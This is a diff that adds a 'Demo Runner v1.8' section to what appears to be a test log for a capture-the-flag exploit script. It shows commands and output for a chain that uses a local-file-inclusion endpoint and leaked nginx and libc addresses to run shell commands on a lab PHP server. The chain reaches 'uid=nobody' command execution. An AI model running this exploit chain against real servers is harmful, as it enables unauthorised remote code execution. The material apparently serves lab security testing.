@@ -675,6 +675,79 @@ core http=404
 
 Status: pass.
 
+## Demo Runner v1.8 Compact Output And Modular File Read
+
+Purpose: verify the current operator-facing runner, compact default output, final command-output placement, and the custom file-read adapter.
+
+Default adapter smoke check:
+
+```bash
+python3 - <<'PY'
+from argparse import Namespace
+import demo_ctf_exploit_v1_8 as d
+base = dict(host='192.168.1.205', port=19321, scheme='http', lfi_endpoint='/lfi.php', file_param='file', offset_param='offset', length_param='length', phpinfo_path='/phpinfo.php', timeout=5)
+for template in (None, 'http://{host}:{port}/lfi.php?file={path_url}{range_query}'):
+    args = Namespace(**base, file_read_template=template)
+    target = d.make_file_read_target(args)
+    print(target.describe()['type'], target.lfi_read('/proc/sys/kernel/randomize_va_space', timeout=5).strip().decode())
+PY
+```
+
+Observed:
+
+```text
+query-params 2
+template 2
+```
+
+Compact-mode exploit command:
+
+```bash
+./demo_ctf_exploit_v1_8.py \
+  --host 192.168.1.205 --cmd 'id; uname -a; seq 1 20' \
+  --fast --artifact-dir artifacts
+```
+
+Observed:
+
+```text
+target profile: lab
+nginx worker PID: 3058
+nginx writable map: 0x55e420b83000
+libc base: 0x7fca47a6d000
+system() address: 0x7fca47abdd70
+HTTP Server: nginx/1.31.0
+PHP version: 8.1.2-1ubuntu2.23
+libc dpkg version: 2.35-0ubuntu3.13
+selected geometry A=127, plus=962 with 60 ranked candidate(s)
+using 60 candidates from the fresh reset core
+winning address: 0x55e4210b2127
+winning body offset: 1376
+run artifact: artifacts/demo_v1_8_20260515-055614.json
+command output printed as final section
+```
+
+Template-backed exploit command:
+
+```bash
+./demo_ctf_exploit_v1_8.py \
+  --host 192.168.1.205 --cmd id --fast --rounds 1 \
+  --artifact-dir artifacts \
+  --file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}'
+```
+
+Observed:
+
+```text
+File read: http://{host}:{port}/lfi.php?file={path_url}{range_query}
+winning address: 0x55e4210b2127
+winning body offset: 1376
+command output: uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+run artifact: artifacts/demo_v1_8_20260515-055639.json
+```
+
+Status: pass. The modular file-read vector was exercised end-to-end, not only by a small read.
+
 ## Demo Artifact Summarizer
 
 Purpose: summarize multiple demo artifacts and surface success/negative-pass status, reset-core PID matches, candidate counts, winning addresses, and command modes.
